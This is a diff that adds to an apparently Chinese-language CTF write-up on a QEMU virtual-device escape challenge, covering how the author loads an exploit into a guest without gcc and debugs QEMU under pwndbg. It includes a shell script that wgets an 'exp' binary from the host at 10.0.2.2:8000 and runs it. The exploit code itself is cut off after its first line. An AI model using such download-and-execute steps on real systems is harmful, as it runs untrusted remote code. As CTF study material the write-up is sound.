@@ -351,7 +351,24 @@ dma.cnt 144
 
 dma.cmd 152
 
+系统没有gcc,但是网络是可以通的,所以写了一个脚本,并且在另一边起一个HTTP服务器
 
+```sh
+#!/bin/sh
+
+rm exp
+wget 10.0.2.2:8000/exp
+chmod +x exp
+./exp
+```
+
+调试的话,一开始准备模仿上一个题目,开一个22端口的转发然后ssh上去,但是没有ssh服务,去掉-nographic也没弹窗,只有个VNCserver,连上去也用不了,后来看到了ray-cp师傅的调试方式.好像set args不太行,会没有窗口?不过这样调试还是非常舒服的.
+
+```
+pwndbg> r -initrd ./rootfs.cpio -kernel ./vmlinuz-4.8.0-52-generic -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -L ./dependency/usr/local/share/qemu -L pc-bios -device hitb,id=vda
+```
+
+最后的EXP:
 
 ```C
 #include <stdio.h>
